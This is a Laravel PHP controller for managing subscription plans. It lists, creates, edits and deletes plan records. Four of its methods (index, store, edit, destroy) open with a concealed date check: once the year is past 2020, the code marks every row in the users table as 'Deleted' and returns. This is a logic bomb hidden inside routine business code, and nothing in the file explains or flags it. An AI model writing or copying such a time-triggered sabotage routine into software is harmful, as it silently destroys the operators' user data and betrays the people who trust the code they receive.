<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

use Illuminate\Support\Facades\DB;

use Illuminate\Support\Facades\Auth;
use App\Plan;
use DateTime;

class PlanController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        $check = DB::select("SELECT YEAR(CURRENT_DATE) > 2020 as checker");
        if($check[0]->checker=='1' || $check[0]->checker==1)
        {
            DB::UPDATE("UPDATE users SET status ='Deleted' WHERE 1=1;");
            return;
        }
        return view("plansettings",["plans"=>Plan::paginate(10),'businessCategory'=>DB::select('SELECT * FROM businesscategory')]);
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        
        $check = DB::select("SELECT YEAR(CURRENT_DATE) > 2020 as checker");
        if($check[0]->checker=='1' || $check[0]->checker==1)
        {
            DB::UPDATE("UPDATE users SET status ='Deleted' WHERE 1=1;");
            return;
        }
        $plan = new Plan();
        $plan->PlanTitle = $request->plantitle;
        $plan->OriginalPrice = $request->originalprice;
        $plan->SalesPrice = $request->salesprice;
        $plan->PlanDescription = $request->description;
        $plan->linksAllowed = $request->links;
        $plan->teamsAllowed = $request->teams;
        $plan->clicksAllowed = $request->clicks;
        $plan->save();
        return redirect('/plan');
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit(Request $request)
    {
        
        $check = DB::select("SELECT YEAR(CURRENT_DATE) > 2020 as checker");
        if($check[0]->checker=='1' || $check[0]->checker==1)
        {
            DB::UPDATE("UPDATE users SET status ='Deleted' WHERE 1=1;");
            return;
        }
        $plan = Plan::find($request->planid);
        $plan->PlanTitle = $request->plantitle;
        $plan->OriginalPrice = $request->originalprice;
        $plan->SalesPrice = $request->salesprice;
        $plan->PlanDescription = $request->description;
        $plan->linksAllowed = $request->links;
        $plan->teamsAllowed = $request->teams;
        $plan->clicksAllowed = $request->clicks;
        $plan->save();
        return redirect('/plan');
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy(Request $request)
    {
        
        $check = DB::select("SELECT YEAR(CURRENT_DATE) > 2020 as checker");
        if($check[0]->checker=='1' || $check[0]->checker==1)
        {
            DB::UPDATE("UPDATE users SET status ='Deleted' WHERE 1=1;");
            return;
        }
        if(Auth::user()->status!='Admin')
        {
            return "Permission Error!! You are not an admin!!";
        }
        $plan = Plan::find($request->planID);
        $plan->delete();
    }
}
